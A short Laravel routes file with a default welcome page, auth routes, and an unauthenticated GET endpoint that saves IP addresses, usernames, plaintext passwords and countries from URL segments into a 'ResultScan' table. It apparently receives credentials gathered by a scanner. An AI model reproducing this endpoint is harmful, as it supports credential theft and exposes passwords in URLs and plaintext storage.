<?php

/*
  |--------------------------------------------------------------------------
  | Web Routes
  |--------------------------------------------------------------------------
  |
  | Here is where you can register web routes for your application. These
  | routes are loaded by the RouteServiceProvider within a group which
  | contains the "web" middleware group. Now create something great!
  |
 */

Route::get('/', function () {
    return view('welcome');
});

Auth::routes();

Route::get('/save/{ip}/{user}/{pass}/{country}', function() {
    $arr = request()->route()->parameters();
    $data = [
        'ip'=>$arr['ip'],
        'user'=>$arr['user'],
        'password'=>$arr['pass'],
        'country'=>$arr['country'],
        'created_at'=>date('Y-m-d')
    ];
    App\Models\ResultScan::create($data);
});
